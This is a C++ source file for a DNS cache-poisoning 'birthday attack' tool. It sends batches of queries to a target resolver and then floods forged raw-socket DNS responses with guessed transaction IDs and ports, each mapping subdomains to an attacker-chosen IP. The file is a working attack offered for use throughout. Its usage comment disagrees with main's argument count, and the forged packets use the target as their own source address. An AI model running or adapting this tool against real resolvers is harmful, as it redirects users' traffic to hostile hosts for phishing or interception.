// Compile: g++ -o birthday birthday.cpp -lpthread
// Run: sudo ./birthday <target_dns> <domain>
// Requires: root privileges

#include <iostream>
#include <cstring>
#include <cstdlib>
#include <ctime>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <thread>
#include <vector>
#include <unordered_set>
#include <random>

class BirthdayAttack {
private:
    std::string targetDNS, targetDomain;
    
    int encodeName(char* buf, const std::string& name) {
        int pos = 0;
        size_t start = 0, dot;
        while ((dot = name.find('.', start)) != std::string::npos) {
            int len = dot - start;
            buf[pos++] = len;
            memcpy(buf + pos, name.c_str() + start, len);
            pos += len;
            start = dot + 1;
        }
        int len = name.length() - start;
        buf[pos++] = len;
        memcpy(buf + pos, name.c_str() + start, len);
        pos += len;
        buf[pos++] = 0;
        return pos;
    }
    
public:
    BirthdayAttack(const std::string& dns, const std::string& domain)
        : targetDNS(dns), targetDomain(domain) {}
    
    // Send N queries with unique identifiers to increase collision probability
    void batchQueries(int count) {
        int sock = socket(AF_INET, SOCK_DGRAM, 0);
        
        struct sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_port = htons(53);
        dest.sin_addr.s_addr = inet_addr(targetDNS.c_str());
        
        for (int i = 0; i < count; i++) {
            char query[512];
            memset(query, 0, sizeof(query));
            
            // Each query uses unique subdomain to have many outstanding
            std::string sub = "bday" + std::to_string(i) + "." + targetDomain;
            
            *(uint16_t*)(query + 0) = htons(rand() & 0xFFFF);
            *(uint16_t*)(query + 2) = htons(0x0100);
            *(uint16_t*)(query + 4) = htons(1);
            
            int pos = 12;
            pos += encodeName(query + pos, sub);
            *(uint16_t*)(query + pos) = htons(1); pos += 2;
            *(uint16_t*)(query + pos) = htons(1); pos += 2;
            
            sendto(sock, query, pos, 0, (struct sockaddr*)&dest, sizeof(dest));
            usleep(100);
        }
        
        close(sock);
    }
    
    // Send flood of guessed responses - birthday paradox says collisions likely
    void floodResponses(int count, const std::string& spoofIP) {
        int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        int one = 1;
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
        
        struct sockaddr_in dest;
        dest.sin_family = AF_INET;
        dest.sin_addr.s_addr = inet_addr(targetDNS.c_str());
        
        std::unordered_set<uint16_t> seenTxids;
        
        for (int i = 0; i < count; i++) {
            // Use random TXID - birthday paradox with 65536 space
            uint16_t txid = rand() & 0xFFFF;
            seenTxids.insert(txid);
            
            uint16_t port = 1024 + (rand() % 64000);
            
            char packet[512];
            memset(packet, 0, sizeof(packet));
            
            struct iphdr* ip = (struct iphdr*)packet;
            struct udphdr* udp = (struct udphdr*)(packet + sizeof(struct iphdr));
            char* dns = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
            
            *(uint16_t*)(dns + 0) = htons(txid);
            *(uint16_t*)(dns + 2) = htons(0x8180);
            *(uint16_t*)(dns + 4) = htons(1);
            *(uint16_t*)(dns + 6) = htons(1);
            
            int pos = 12;
            std::string sub = "bday" + std::to_string(i % 1000) + "." + targetDomain;
            pos += encodeName(dns + pos, sub);
            *(uint16_t*)(dns + pos) = htons(1); pos += 2;
            *(uint16_t*)(dns + pos) = htons(1); pos += 2;
            
            *(uint16_t*)(dns + pos) = htons(0xC00C); pos += 2;
            *(uint16_t*)(dns + pos) = htons(1); pos += 2;
            *(uint16_t*)(dns + pos) = htons(1); pos += 2;
            *(uint32_t*)(dns + pos) = htonl(3600); pos += 4;
            *(uint16_t*)(dns + pos) = htons(4); pos += 2;
            struct in_addr addr;
            inet_aton(spoofIP.c_str(), &addr);
            memcpy(dns + pos, &addr.s_addr, 4); pos += 4;
            
            udp->source = htons(53);
            udp->dest = htons(port);
            udp->len = htons(sizeof(struct udphdr) + pos);
            udp->check = 0;
            
            ip->ihl = 5;
            ip->version = 4;
            ip->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + pos;
            ip->ttl = 64;
            ip->protocol = IPPROTO_UDP;
            ip->saddr = inet_addr(targetDNS.c_str());
            ip->daddr = inet_addr(targetDNS.c_str());
            ip->check = 0;  // Kernel calculates
            
            dest.sin_port = htons(port);
            sendto(sock, packet, ip->tot_len, 0, (struct sockaddr*)&dest, sizeof(dest));
        }
        
        close(sock);
        std::cout << "[*] Sent " << count << " responses, unique TXIDs: " 
                  << seenTxids.size() << "\n";
    }
    
    void run(const std::string& spoofIP) {
        std::cout << "[*] Birthday attack - batch queries first\n";
        batchQueries(500);
        
        std::cout << "[*] Flooding responses...\n";
        floodResponses(50000, spoofIP);
    }
};

int main(int argc, char* argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] << " <target_dns> <domain> <spoof_ip>\n";
        return 1;
    }
    srand(time(NULL));
    BirthdayAttack attack(argv[1], argv[2]);
    attack.run(argv[3]);
    return 0;
}
